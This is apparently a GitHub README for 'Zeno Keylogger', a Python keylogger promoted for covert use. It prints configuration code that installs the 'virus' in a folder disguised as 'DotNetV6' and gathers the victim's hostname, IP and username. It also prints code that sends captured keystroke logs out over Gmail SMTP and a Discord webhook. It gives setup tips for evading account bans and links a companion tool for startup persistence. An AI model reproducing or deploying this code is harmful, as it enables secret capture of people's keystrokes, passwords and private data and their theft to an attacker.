![alt text](https://github.com/Zurek0x/zeno_Hijacker/blob/main/media/Screenshot_1.png?raw=true)
# Zeno Keylogger / Written in Python (EMAIL SERVICE)
This is a keylogger written in Python that includes certain sending methods of logs
specifically Email Servicing and Discord Webhooking.
This is a better way to recieve logs since it doesn't require much effort or leaking
of server configurations or server handling which can be confusing for people and could
lead to more leaks.

# Usage (Pieces of code, Look in Source)
```python
# =?/Settings/?= #
hostname=socket.gethostname()   # Get Hostname of PC (For Logging)
IPAddr=socket.gethostbyname(hostname) # Get IP of PC (For Logging)

user = os.getlogin()# get username of PC
self_path=str(f"{os.getcwd()}") # Get Path of Self #
install_path=str(f"C:\\Users\\{user}\\Documents\\DotNetV6") # Path to install the virus too ( MUST HAVE \\ not \ )
email=str("null@gmail.com") # Email you want to recieve key logs on.
subject=str(f"") # DO NOT TOUCH THIS!
data=str("") # DO NOT TOUCH THIS!

cache = [""] # DO NOT TOUCH THIS!
filename=str("cache.txt") # Cache file name (must include .txt or .md)
file_size_limit_bytes=int(500) # File size limit before it sends Email and clears cache.
```
**Would suggest to change the full_size_limit_bytes=int(500) since this is the max file size before it sends the Email**
```python
class Mail:
    def __init__(self):
        self.port = 465
        self.smtp_server_domain_name = "smtp.gmail.com"
        self.sender_mail = "null@gmail.com"
        self.password = "null"
    def send(self, emails, subject, content):
        ssl_context = ssl.create_default_context()
        service = smtplib.SMTP_SSL(self.smtp_server_domain_name, self.port, context=ssl_context)
        service.login(self.sender_mail, self.password)
        for email in emails:
            result = service.sendmail(self.sender_mail, email, f"Subject: {subject}\n{content}")
        service.quit()

class Send:
    # Gmail #
    def Gmail(email, subject, data):
        mails=str(email).split()
        subject=subject
        content=str(data)
        print(content)
        mail = Mail()
        mail.send(mails, subject, content)
        print("Sent")
    # Discord Webhook #
    def Webhook(subject, install_path, filename):
        webhook_url=str("discord webhook")
        constructed_data=str(f"""
```
{subject}
```
        """)
        webhook = DiscordWebhook(url=str(webhook_url),
        content=str(constructed_data),
        rate_limit_retry=True,
        username=f"Webhook With Files"
        )
        with open(f"{install_path}\\{filename}", "r") as f:
            webhook.add_file(file=f.read(), filename=f"log.txt")
        response = webhook.execute()
```

# !NOTICE FOR GMAIL OR GOOGLE USERS!
**For gmail users who are sending the Emails using Google Email Services like Gmail must setup a Less Secure App.**
**To set this up review the video here -> https://youtu.be/pAPWBHxnFHM <- Once you do this replace the 2 Lines below.**
![alt text](https://github.com/Zurek0x/zeno_keylogger/blob/main/media/mok.png?raw=true)
# !NOTICE FOR DISCORD/WEBHOOK USERS!
**To setup your discord webhook go inside the file "exec_send.py" and find the line called "webhook_url=str("Your Webhook")" and replace it with your discord webhook that you are going to use to recieve messages.**
**Most people should be able to do this, No guide is needed.**
# !NOTICE FOR BOTH! #
**It should be advised that the discord webhook is way faster and more reliable then Email Service but do keep in note it is against discords Terms Of Service and Conduct which could lead to your account getting banned.**
**Of course this is very rare and usually doesn't happen as long as nobody reports your account or webhook, But do keep in note of that.**

# Starting up with windows and extra stuff
To use these features you must import the code into zeno_Embedder which is a tool to do exactly this -> https://github.com/Zurek0x/zeno_Embedder